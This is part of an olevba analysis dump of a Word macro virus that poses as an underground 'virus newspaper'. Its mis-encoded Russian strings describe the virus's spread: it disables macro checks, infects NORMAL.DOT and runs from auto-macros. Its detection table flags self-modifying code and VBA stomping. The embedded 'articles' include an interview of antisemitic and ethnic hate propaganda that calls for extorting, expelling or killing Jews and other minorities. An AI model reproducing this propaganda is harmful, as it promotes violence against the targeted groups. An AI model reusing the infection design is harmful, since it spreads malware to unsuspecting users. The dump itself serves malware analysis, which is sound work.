' 	LitStr 0x0019 "ÐÎÆÄÅÍÈÅ  ÍÎÂÎÃÎ  ÈÇÄÀÍÈß"
' 	St Artikel_1$ 
' Line #225:
' 	EndIfBlock 
' Line #226:
' 	Ld T 
' 	LitDI2 0x0002 
' 	Eq 
' 	IfBlock 
' Line #227:
' 	Ld Ab 
' 	SelectCase 
' Line #228:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' Line #229:
' 	LitStr 0x027F "Óâàæàåìûå ÷èòàòåëè! Âû ïðèñóòñòâóåòå ïðè óíèêàëüíîì ñîáûòèè: ðîæäàåòñÿ íå ïðîñòî íîâîå èçäàíèå, êàê ñëåäóåò èç çàãîëîâêà, à ïðèíöèïèàëüíî íîâûé òèï ïåðèîäè÷åñêîãî èçäàíèÿ - âèðóñíàÿ ãàçåòà. Â íûíåøíåå âðåìÿ èíôîðìàöèîííûå òåõíîëîãèè ïðî÷íî âîøëè â íàø áûò; ïî÷òè êàæäûé ÷åëîâåê çíàåò, ÷òî òàêîå êîìïüþòåð, èëè äàæå èìååò åãî ó ñåáÿ äîìà; ìû íå ìûñëèì ñâîåé æèçíè áåç Internet'à. Âñå çíàþò (õîòÿ áû ïîíàñëûøêå) î êîìïüþòåðíûõ âèðóñàõ, è ñîçäàâàåìûõ èìè ïðîáëåìàõ. Äî ñèõ ïîð áûòîâàëî ìíåíèå, ÷òî êîìïüþòåðíûé âèðóñ ìîæåò ïðèíîñèòü òîëüêî âðåä, îäíàêî ìû ïîñòàâèëè ñâîåé öåëüþ îïðîâåðãíóòü äàííîå çàÿâëåíèå, íàéäÿ âèðóñó ïîëåçíîå ïðèìåíåíèå."
' 	St Artikel_1$ 
' Line #230:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #231:
' 	LineCont 0x0004 04 00 04 00
' 	LitStr 0x0331 "Êàê èçâåñòíî, âî âñå âðåìåíà ñðåäñòâà ìàññîâîé èíôîðìàöèè (çäåñü è äàëåå - ÑÌÈ) èãðàëè âàæíóþ ðîëü â æèçíè îáùåñòâà. Îñîáûì ñïðîñîì ïîëüçóþòñÿ ÑÌÈ, íå êîíòðîëèðóåìûå ðàçíîãî ðîäà âëàñòíûìè ñòðóêòóðàìè, à òàêæå íå ïðåäúÿâëÿþùèå ïîâûøåííûõ òðåáîâàíèé ê ñâîèì ÷èòàòåëÿì. Ê ïðèìåðó: ìíîãèå õîòÿò ïîìåùàòü ñâîè îáúÿâëåíèÿ àíîíèìíî è ïî âîçìîæíîñòè áåñïëàòíî, ïóáëèêîâàòü ïîä âûìûøëåííûì èìåíåì èëè àíîíèìíî ìàòåðèàëû ëþáîãî îáúåìà è ñîäåðæàíèÿ è ò.ï. Îôèöèàëüíûå èçäàíèÿ äåëàþò òàêîå íåâîçìîæíûì èëè êðàéíå çàòðóäíÿþò, ÷åì âûçûâàþò çàêîííóþ íåïðèÿçíü ó áîëüøèíñòâà ãðàæäàí. Íàøà ãàçåòà  íå èìååò äàííûõ íåäîñòàòêîâ, òàê êàê ÿâëÿåòñÿ íåëåãàëüíîé, è êàê ñëåäñòâèå - ïîäïîëüíîé. Ïîäïîëüíûå ãàçåòû ñóùåñòâîâàëè è ðàíåå, îäíàêî èõ èçäàíèå è ðàñïðîñòðàíåíèå áûëî ñâÿçàíî ñ áîëüøèì ðèñêîì êàê äëÿ ÷èòàòåëåé, òàê è äëÿ èçäàòåëåé. "
' 	LitStr 0x0184 "Òî æå ñàìîå ìîæíî ñêàçàòü è î ðàñïðîñòðàíåíèè ëèñòîâîê. Ýòè íåäîñòàòêè ìîãóò áûòü óñòðàíåíû ïðè ïîìîùè ïåðåâîäà ãàçåòû íà íîâóþ îñíîâó, èñêëþ÷àþùóþ èëè ñâîäÿùóþ ê ìèíèìóìó êîíòàêò ÷èòàòåëåé ñ èçäàòåëüñòâîì. Â êà÷åñòâå òàêîé îñíîâû áûëî ðåøåíî èñïîëüçîâàòü êîìïüþòåðíûé âèðóñ, òàê êàê îí ñïîñîáåí ðàñïðîñòðàíÿòüñÿ áåç âìåøàòåëüñòâà ÷åëîâåêà âåçäå, ãäå åñòü âîñïðèèì÷èâûå ê íåìó êîìïüþòåðû."
' 	Concat 
' 	St Artikel_1$ 
' Line #232:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #233:
' 	LineCont 0x0004 04 00 04 00
' 	LitStr 0x03D9 "Êàê èçâåñòíî, êîìïüþòåðíûå âèðóñû êëàññèôèöèðóþòñÿ ïî íåñêîëüêèì ïðèçíàêàì, â ÷àñòíîñòè, ïî ñòåïåíè ïðè÷èíÿåìîãî èìè âðåäà. Âèðóñû, íàçûâàåìûå "áåçâðåäíûìè", òîëüêî ðàçìíîæàþòñÿ è çàíèìàþò ïàìÿòü; òàê íàçûâàåìûå "íåîïàñíûå" âèðóñû â äîïîëíåíèå ê  ïåðå÷èñëåííîìó ïðîèçâîäÿò ðàçëè÷íûå çâóêîâûå, ãðàôè÷åñêèå è ïðî÷èå ýôôåêòû. Îñòàëüíûå ðàçíîâèäíîñòè âèðóñîâ ìû íå áóäåì ðàññìàòðèâàòü, òàê êàê îíè íå ïîòðåáóþòñÿ äëÿ äàëüíåéøåãî îáúÿñíåíèÿ. Äî ñèõ ïîð âèðóñû, îòíîñèìûå ê "íåîïàñíûì", âûâîäèëè òîëüêî ñîîáùåíèÿ, íå èìåþùèå â áîëüøèíñòâå ñëó÷àåâ, íèêàêîé ïðàêòè÷åñêîé öåííîñòè; îäíàêî, íå òðåáóåò äîêàçàòåëüñòâ, ÷òî òàêîé âèðóñ â ïðèíöèïå ìîæåò âûâåñòè íà ýêðàí òåêñò ãàçåòû èëè ëèñòîâêè. Ñòîèò òîëüêî îñíàñòèòü âèðóñ òàêîé "íà÷èíêîé", è îí ñòàíîâèòñÿ ñîîòâåòñòâåííî ãàçåòîé èëè ëèñòîâêîé, êîòîðàÿ ðàñïðîñòðàíÿåò ñåáÿ ñàìà. Ïðè ýòîì âîçíèêàåò ñëåäóþùàÿ ïðîáëåìà: ãàçåòà âûõîäèò ïåðèîäè÷åñêè, è åå íîâûå íîìåðà äîëæíû âûòåñíÿòü èç ñðåäû îáèòàíèÿ ñòàðûå. Ïîäîáíîå íå ÿâëÿåòñÿ íåâîçìîæíûì äëÿ "
' 	LitStr 0x01ED "êîìïüþòåðíûõ âèðóñîâ: íåêîòîðûå èç íèõ ñíàáæåíû ìåõàíèçìîì îáíîâëåíèÿ âåðñèè, ÷òî ïðè ñîîòâåòñòâóþùåé äîðàáîòêå ìîæåò áûòü ïðèìåíåíî äëÿ çàìåíû ñòàðîãî íîìåðà ãàçåòû íîâûì. Äëÿ ðåàëèçàöèè òàêîé ãàçåòû íåîáõîäèìî âûáðàòü ñðåäó îáèòàíèÿ âèðóñà. Íàèáîëåå öåëåñîîáðàçíûì ïðåäñòàâëÿåòñÿ ðàñïðîñòðàíåíèå ïîäïîëüíîé ãàçåòû ïðè ïîìîùè ìàêðîâèðóñà, òàê êàê â íàñòîÿùåå âðåìÿ ÷àùå âñåãî ñ êîìïüþòåðà íà êîìïüþòåð ïåðåíîñÿò äîêóìåíòû è ýëåêòðîííûå òàáëèöû, êîòîðûå ÿâëÿþòñÿ ñðåäîé îáèòàíèÿ òàêèõ âèðóñîâ."
' 	Concat 
' 	St Artikel_1$ 
' Line #234:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #235:
' 	LitStr 0x033D "Íàøà ñåêòà áûëà ñîçäàíà â 1991 ãîäó, îäíàêî äî ñèõ ïîð íå èìåëà ñâîåãî ïå÷àòíîãî îðãàíà, ÷òî ÿâëÿåòñÿ ñåðüåçíûì íåäîñòàòêîì. Èíîãäà ìû ïî ðàçíûì ïîâîäàì ïèñàëè â ðàçëè÷íûå ãàçåòû, íî íàøè ìàòåðèàëû óïîðíî íå ïóáëèêîâàëèñü, çà èñêëþ÷åíèåì îäíîãî ðàçà. Òåïåðü ìû ðåøèëè äàííóþ ïðîáëåìó ïóòåì ñîçäàíèÿ ñîáñòâåííîé âèðóñíîé ãàçåòû. Íå ñëåäóåò äóìàòü, îäíàêî, ÷òî çäåñü áóäóò ïå÷àòàòüñÿ òîëüêî ìàòåðèàëû íàøèõ ñåêòàíòîâ; íàîáîðîò, ìû ñòàðàåìñÿ áûòü îòêðûòûìè äëÿ âñåõ, âíå çàâèñèìîñòè îò âåðîèñïîâåäàíèÿ, íàöèîíàëüíîñòè è ïîëèòè÷åñêèõ óáåæäåíèé. Ãàçåòà âûõîäèò ïî ìåðå êîìïëåêòîâàíèÿ íîìåðà. Â áëèæàéøåì áóäóùåì áóäåò îïóáëèêîâàí ñïîñîá ñâÿçè ñ íàøåé ðåäàêöèåé, êîòîðûì ñìîæåò âîñïîëüçîâàòüñÿ êàæäûé, êòî çíàêîì ñ ÿçûêîì ïðîãðàììèðîâàíèÿ Visual Basic. Äëÿ òåõ, êòî íå çíàêîì ñ ïðîãðàììèðîâàíèåì, â ãîðîäå èìååòñÿ ñåòü êîððåñïîíäåíòîâ."
' 	St Artikel_1$ 
' Line #236:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' Line #237:
' 	LitStr 0x004F "Áîëåå ïîäðîáíî î âèðóñå ðàññêàæåò íèæå íàø ãëàâíûé ïðîãðàììèñò Àëåêñàíäð Ðûæîâ."
' 	St Artikel_1$ 
' Line #238:
' 	CaseElse 
' Line #239:
' 	LitStr 0x0000 ""
' 	St Artikel_1$ 
' Line #240:
' 	EndSelect 
' Line #241:
' 	EndIfBlock 
' Line #242:
' 	Ld T 
' 	LitDI2 0x0003 
' 	Eq 
' 	IfBlock 
' Line #243:
' 	LitStr 0x0022 "Ãëàâíûé ðåäàêòîð    Â. Ä. Òàðàñêèí"
' 	St Artikel_1$ 
' Line #244:
' 	EndIfBlock 
' Line #245:
' 	EndFunc 
' Line #246:
' Line #247:
' 	FuncDefn (Private Function Artikel_2(T, Ab, id_FFFE As String))
' Line #248:
' 	Ld T 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #249:
' 	LitStr 0x001F "ÃÀÇÅÒÍÛÉ ÂÈÐÓÑ: ×ÒÎ ÝÒÎ ÒÀÊÎÅ ?"
' 	St Artikel_2$ 
' Line #250:
' 	EndIfBlock 
' Line #251:
' 	Ld T 
' 	LitDI2 0x0002 
' 	Eq 
' 	IfBlock 
' Line #252:
' 	Ld Ab 
' 	SelectCase 
' Line #253:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' Line #254:
' 	LitStr 0x00D9 "Ñðàçó ñïåøó óñïîêîèòü íàøèõ ÷èòàòåëåé: âèðóñ, ðàñïðîñòðàíÿþùèé ãàçåòó "Àäñêèé îãîíü", íå èìååò íèêàêèõ âñòðîåííûõ äåñòðóêòèâíûõ ôóíêöèé è íå ñîäåðæèò îøèáîê, çàòðóäíÿþùèõ ðàçìíîæåíèå èëè óãðîæàþùèõ ðàçðóøåíèåì äàííûõ."
' 	St Artikel_2$ 
' Line #255:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #256:
' 	LitStr 0x023A "Âèðóñ, êîòîðûé ìû óñëîâíî íàçûâàåì "Inferno", ïðåäñòàâëÿåò ñîáîé ìàêðîâèðóñ, ïîðàæàþùèé äîêóìåíòû â ôîðìàòå Microsoft Word. Îí ñîñòîèò èç ðÿäà ïðîöåäóð, êîòîðûå îáåñïå÷èâàþò åãî ðàçìíîæåíèå, ñìåíó ñòàðîãî íîìåðà íîâûì, ñîáñòâåííî ïå÷àòü ìàòåðèàëîâ, à òàêæå àâòîìàêðîñû, çàïóñêàåìûå ïðè îòêðûòèè, çàêðûòèè è ñîçäàíèè íîâîãî ôàéëà. Ïåðâàÿ ñòðîêà ñîäåðæèò ñèãíàòóðó âèðóñà, âòîðàÿ - àâòîðñêèé çíàê, à òðåòüÿ - ñòðîêîâóþ çàïèñü íîìåðà ãàçåòû. Âî âòîðîé ñòðîêå çàêîäèðîâàíû èìåíà è ôàìèëèè àâòîðîâ âèðóñà, êîòîðûå ïðîäàëè íàì òåêñò ïðîãðàììû è ïîæåëàëè îñòàòüñÿ íåèçâåñòíûìè."
' 	St Artikel_2$ 
' Line #257:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #258:
' 	LitStr 0x0173 "Ïðè îòêðûòèè çàðàæåííîãî ôàéëà îòêëþ÷àåòñÿ ïðîâåðêà äîêóìåíòîâ íà ïðåäìåò íàëè÷èÿ ìàêðîñîâ, ïðîèñõîäèò çàðàæåíèå øàáëîíà NORMAL.DOT (åñëè îí íå çàðàæåí, èëè çàðàæåí áîëåå ðàííèì íîìåðîì ãàçåòû). Åñëè øàáëîí óæå ñîäåðæèò êàêèå-ëèáî ìàêðîñû, òî îíè ïåðåíîñÿòñÿ â òåêñòîâûé ôàéë NORMAL.TXT. Åñëè ôàéë ñ òàêèì èìåíåì óæå ñóùåñòâóåò, òî ïåðåíîñèìûå ìàêðîñû äîáàâëÿþòñÿ ê íåìó."
' 	St Artikel_2$ 
' Line #259:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #260:
' 	LitStr 0x00F0 "Çàòåì êàæäûé íîâûé ôàéë, îñíîâàííûé íà ýòîì øàáëîíå áóäåò çàðàæàòüñÿ ïðè ñîçäàíèè è ïðè çàêðûòèè. Åñëè îí óæå ñîäåðæèò êàêèå-íèáóäü ìàêðîñû, òî îíè òàêæå ïåðåíîñÿòñÿ â òåêñòîâûé ôàéë (*.TXT), èìÿ êîòîðîãî ñîâïàäàåò ñ èìåíåì ôàéëà äîêóìåíòà."
' 	St Artikel_2$ 
' Line #261:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' Line #262:
' 	LitStr 0x0078 "Â çàâèñèìîñòè îò ñëó÷àéíîãî ñ÷åò÷èêà (â îïðåäåëåííûå äíè îáÿçàòåëüíî) â ðåäàêòèðóåìûé äîêóìåíò âñòàâëÿåòñÿ òåêñò ãàçåòû."
' 	St Artikel_2$ 
' Line #263:
' 	CaseElse 
' Line #264:
' 	LitStr 0x0000 ""
' 	St Artikel_2$ 
' Line #265:
' 	EndSelect 
' Line #266:
' 	EndIfBlock 
' Line #267:
' 	Ld T 
' 	LitDI2 0x0003 
' 	Eq 
' 	IfBlock 
' Line #268:
' 	LitStr 0x0027 "Ãëàâíûé ïðîãðàììèñò ñåêòû   À. Â. Ðûæîâ"
' 	St Artikel_2$ 
' Line #269:
' 	EndIfBlock 
' Line #270:
' 	EndFunc 
' Line #271:
' Line #272:
' 	FuncDefn (Private Function Artikel_3(T, Ab, id_FFFE As String))
' Line #273:
' 	Ld T 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #274:
' 	LitStr 0x0018 "ÃÄÅ  ÆÅ  ÂÛ,  ÐÓÑÑÊÈÅ  ?"
' 	St Artikel_3$ 
' Line #275:
' 	EndIfBlock 
' Line #276:
' 	Ld T 
' 	LitDI2 0x0002 
' 	Eq 
' 	IfBlock 
' Line #277:
' 	Ld Ab 
' 	SelectCase 
' Line #278:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' Line #279:
' 	LitStr 0x00BA "Ïåðâûé ìàòåðèàë, îïóáëèêîâàííûé â íàøåé ãàçåòå, ïîñâÿùåí íàöèîíàëüíîìó âîïðîñó. Íàø êîððåñïîíäåíò Ì. Â. ×óðèëîâ áåñåäóåò ñ ãëàâîé àñòðàõàíñêîãî ôèëèàëà "Ðóññêîãî íàöèîíàëüíîãî åäèíñòâà"."
' 	St Artikel_3$ 
' Line #280:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #281:
' 	LitStr 0x001C "- Íàçîâèòå, ïîæàëóéñòà ñåáÿ."
' 	St Artikel_3$ 
' Line #282:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #283:
' 	LitStr 0x00A0 "- Ââèäó îïàñíîñòè ìîåé ðàáîòû ÿ íå ìîãó íàçâàòü ñâîå íàñòîÿùåå èìÿ; ó ìåíÿ åñòü ïñåâäîíèì, êîòîðûé ÿ âàì ñîîáùó: Ñàïóãèí Åâãåíèé Àíàòîëüåâè÷. Òàê ìåíÿ è çîâèòå."
' 	St Artikel_3$ 
' Line #284:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #285:
' 	LitStr 0x001C "- Èìÿ è îò÷åñòâî íàñòîÿùèå ?"
' 	St Artikel_3$ 
' Line #286:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' Line #287:
' 	LitStr 0x001D "- Îá ýòîì äîãàäûâàéòåñü ñàìè."
' 	St Artikel_3$ 
' Line #288:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' Line #289:
' 	LitStr 0x004D "- ×òî âû ïîäðàçóìåâàåòå ïîä "ðàáîòîé", êîòîðàÿ ñîïðÿæåíà ñ òàêîé îïàñíîñòüþ ?"
' 	St Artikel_3$ 
' Line #290:
' 	LitDI2 0x0006 
' 	Case 
' 	CaseDone 
' Line #291:
' 	LitStr 0x0294 "- Ãëàâíàÿ öåëü íàøåé îðãàíèçàöèè ñîñòîèò â òîì, ÷òîáû î÷èñòèòü Ðîññèþ îò ðàçíîãî ðîäà ýòíè÷åñêîãî ìóñîðà, êîòîðûé çàãëóøàåò âñå èñêîííî ðóññêîå, è íå äàåò ñòðàíå íîðìàëüíî æèòü. Ýòîò ìóñîð íå õî÷åò áûòü âûìåòåííûì, è ïûòàåòñÿ ðàçäåëàòüñÿ ñ íàìè, â ñâÿçè  ñ ÷åì ïðåäñòàâëÿåò áîëüøóþ îïàñíîñòü. Åñëè âû âíèìàòåëüíî ïðèãëÿíåòåñü ê òåïåðåøíåé ñèòóàöèè, òî íå ìîæåòå íå çàìåòèòü, ÷òî ïî÷òè íà êàæäîì êëþ÷åâîì ïîñòó, èìåþùåì õîòü êàêîå-òî çíà÷åíèå, ñèäèò êàêîé-íèáóäü èíîðîäåö (÷àùå âñåãî - åâðåé) è âüåò âåðåâêè èç íàñòîÿùèõ ðóññêèõ. Íå çàáûâàéòå, ÷òî ìû - ãîñóäàðñòâîîáðàçóþùàÿ íàöèÿ, è äîëæíû çàùèùàòüñÿ îò òàêîé ïàäàëè âñåìè äîñòóïíûìè è íåäîñòóïíûìè ñðåäñòâàìè."
' 	St Artikel_3$ 
' Line #292:
' 	LitDI2 0x0007 
' 	Case 
' 	CaseDone 
' Line #293:
' 	LitStr 0x0022 "- Êàêèå ñðåäñòâà Âû èìååòå â âèäó?"
' 	St Artikel_3$ 
' Line #294:
' 	LitDI2 0x0008 
' 	Case 
' 	CaseDone 
' Line #295:
' 	LitStr 0x02FF "- Â íà÷àëå íàì ïðèäåòñÿ äåéñòâîâàòü íåëåãàëüíûìè ìåòîäàìè. Èíîðîäöû ñèäÿò âåçäå è ïûòàþòñÿ âñåìè ñðåäñòâàìè îòòåñíèòü íàñ îò ðû÷àãîâ óïðàâëåíèÿ; íàãëÿäíûì ïðèìåðîì òîãî ÿâëÿåòñÿ çàïðåùåíèå ïàðòèè "Ðóññêîå íàöèîíàëüíîå åäèíñòâî" è îòìåíà ðåãèñòðàöèè äâèæåíèÿ "Ñïàñ". Çà ýòî îíè äîëæíû ïîíåñòè è ïîíåñóò ñóðîâîå íàêàçàíèå, íî ñíà÷àëà èç íèõ íåîáõîäèìî âûæàòü âñå, ÷òî ìîæåò ïîéòè íà ïîëüçó Ðîññèè, òî åñòü äåíüãè, èìóùåñòâî, çíàíèÿ, îïûò è ìíîãîå äðóãîå. Ïîñêîëüêó îíè íå îòäàäóò íè÷åãî äîáðîâîëüíî, íàì ïðèäåòñÿ âçÿòü ýòî ñèëîé. Âñå áîãàòûå åâðåè è ïðî÷èå èíîðîäöû äîëæíû áûòü â íà÷àëå îáëîæåíû íàëîãîì íà ïðàâî æèòü â Ðîññèè èëè ïðèâëåêàòüñÿ ê ðàçíîãî ðîäà ïðèíóäèòåëüíûì âèäàì äåÿòåëüíîñòè. Çà îòêàç îò óïëàòû äîëæíà ñëåäîâàòü ðàñïðàâà íàä äîëæíèêîì èëè åãî ðîäíûìè."
' 	St Artikel_3$ 
' Line #296:
' 	LitDI2 0x0009 
' 	Case 
' 	CaseDone 
' Line #297:
' 	LitStr 0x0057 "- Ïðàâèëüíî ëè ÿ ïîíÿë, ÷òî Âû ïðåäëàãàåòå îáû÷íûé ðýêåò âñåõ ñîñòîÿòåëüíûõ èíîðîäöåâ ?"
' 	St Artikel_3$ 
' Line #298:
' 	LitDI2 0x000A 
' 	Case 
' 	CaseDone 
' Line #299:
' 	LitStr 0x002B "- Äà, íåêîòîðûå íàçûâàþò ýòî òàêèì îáðàçîì."
' 	St Artikel_3$ 
' Line #300:
' 	LitDI2 0x000B 
' 	Case 
' 	CaseDone 
' Line #301:
' 	LitStr 0x003E "- À êàê âû îòíîñèòåñü ê ðóññêèì, ñîñòîÿùèì â ñìåøàííûõ áðàêàõ?"
' 	St Artikel_3$ 
' Line #302:
' 	LitDI2 0x000C 
' 	Case 
' 	CaseDone 
' Line #303:
' 	LitStr 0x00F3 "- ß ñ÷èòàþ òàêèõ ëþäåé ïðåäàòåëÿìè ñâîåé íàöèè, êîòîðûå çàñîðÿþò ãåíîôîíä ðóññêîãî íàðîäà ðàçíûì äåðüìîì; îíè äîëæíû îáëàãàòüñÿ íàðàâíå ñ âûøåóïîìÿíóòûìè êàòåãîðèÿìè ãðàæäàí. Ðîæäåííûå â òàêèõ áðàêàõ äåòè-ïîëóêðîâêè ïîäëåæàò òîìó æå îáëîæåíèþ."
' 	St Artikel_3$ 
' Line #304:
' 	LitDI2 0x000D 
' 	Case 
' 	CaseDone 
' Line #305:
' 	LitStr 0x0082 "- Êàê ïîíèìàòü ñëîâî "ïîëóêðîâêè" ?  Íå ïûòàåòåñü ëè Âû ââåñòè êóëüò "÷èñòîòû êðîâè", âîñïåòûé êîãäà-òî Ãèòëåðîì è åãî ïîäðó÷íûìè?"
' 	St Artikel_3$ 
' Line #306:
' 	LitDI2 0x000E 
' 	Case 
' 	CaseDone 
' Line #307:
' 	LitStr 0x027C "- "×èñòîòà êðîâè" åñòü íàøà ïðîãðàììà-ìàêñèìóì, îäíàêî äî íåå íàì åùå î÷åíü äàëåêî. Äåëî â òîì, ÷òî íàø ãåíîôîíä ñèëüíî çàñîðåí, è åãî î÷èñòêà ïîòðåáóåò íåìàëîãî âðåìåíè; ñåé÷àñ ìû äîëæíû îñòàíîâèòü, íàñêîëüêî ýòî âîçìîæíî, ïðîöåññ åãî äàëüíåéøåãî çàñîðåíèÿ. Îñîáåííî îïàñíû â ýòîì îòíîøåíèè åâðåè: ýòîò íàðîä äîëãîå âðåìÿ ïîäâåðãàë ñåáÿ èíáðèäèíãó, â ðåçóëüòàòå ÷åãî íàêîïèë ãðîìàäíîå êîëè÷åñòâî îïàñíûõ, âïëîòü äî ëåòàëüíûõ ãåíîâ. Îíè â ïåðâóþ î÷åðåäü äîëæíû áûòü âûñëàíû çà ïðåäåëû Ðîññèè èëè ëèêâèäèðîâàíû. ×òî æå êàñàåòñÿ Ãèòëåðà, òî êóëüò "÷èñòîòû êðîâè" è ãåíîöèä åâðååâ ïðèäóìàëè çàäîëãî äî íåãî; îí òîëüêî óñîâåðøåíñòâîâàë ýòî."
' 	St Artikel_3$ 
' Line #308:
' 	LitDI2 0x000F 
' 	Case 
' 	CaseDone 
' Line #309:
' 	LitStr 0x0044 "- Êàêèå êîíêðåòíûå äåéñòâèÿ âû ïðåäïðèíèìàåòå â äàííîì íàïðàâëåíèè ?"
' 	St Artikel_3$ 
' Line #310:
' 	LitDI2 0x0010 
' 	Case 
' 	CaseDone 
' Line #311:
' 	LitStr 0x012C "- Ìû îòîáðàëè íàèáîëåå ÷èñòîêðîâíûõ ëþäåé ñðåäè ñâîèõ ÷ëåíîâ, è ïûòàåìñÿ âîçðîäèòü ñâîé èñêîííûé ãåíîôîíä, íàñêîëüêî ýòî äîïóñêàåò âîçìîæíîñòü. Äåíüãè, íåîáõîäèìûå äëÿ íàøåé äåÿòåëüíîñòè, áóäåì âûêîëà÷èâàòü èç ñîñòîÿòåëüíûõ åâðååâ, òàòàð è ïðî÷èõ âûðîäêîâ, ïî íåäîðàçóìåíèÿ îêàçàâøèõñÿ â ýòîé ñòðàíå."
' 	St Artikel_3$ 
' Line #312:
' 	LitDI2 0x0011 
' 	Case 
' 	CaseDone 
' Line #313:
' 	LitStr 0x0080 "- Âàì íå êàæåòñÿ, ÷òî â Àñòðàõàíè òàêàÿ çàäà÷à ìîæåò îêàçàòüñÿ ÷ðåçâû÷àéíî òðóäíîé, âåäü ïðîöåíò ðóññêèõ  çäåñü âåñüìà íåâåëèê ?"
' 	St Artikel_3$ 
' Line #314:
' 	LitDI2 0x0012 
' 	Case 
' 	CaseDone 
' Line #315:
' 	LitStr 0x0085 "- Ìû â ýòîì óâåðåíû, íî ê òðóäíîñòÿì ïðèâûêëè, è ñ÷èòàåì çàäà÷ó âïîëíå ðàçðåøèìîé. Êàê ãîâîðèòñÿ â ïîãîâîðêå: "äîðîãó îñèëèò èäóùèé"."
' 	St Artikel_3$ 
' Line #316:
' 	LitDI2 0x0013 
' 	Case 
' 	CaseDone 
' Line #317:
' 	LitStr 0x0024 "- Æåëàþ Âàì óñïåõà. Âñåãî õîðîøåãî !"
' 	St Artikel_3$ 
' Line #318:
' 	LitDI2 0x0014 
' 	Case 
' 	CaseDone 
' Line #319:
' 	LitStr 0x000E "- Äî ñâèäàíèÿ."
' 	St Artikel_3$ 
' Line #320:
' 	CaseElse 
' Line #321:
' 	LitStr 0x0000 ""
' 	St Artikel_3$ 
' Line #322:
' 	EndSelect 
' Line #323:
' 	EndIfBlock 
' Line #324:
' 	Ld T 
' 	LitDI2 0x0003 
' 	Eq 
' 	IfBlock 
' Line #325:
' 	LitStr 0x0030 "Áåñåäó ïðîâîäèë íàø êîððåñïîíäåíò  Ì. Â. ×óðèëîâ"
' 	St Artikel_3$ 
' Line #326:
' 	EndIfBlock 
' Line #327:
' 	EndFunc 
' Line #328:
' Line #329:
' Line #330:
' Line #331:
' Line #332:
' Line #333:
' Line #334:
' Line #335:
' Line #336:
' Line #337:
' Line #338:
' Line #339:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

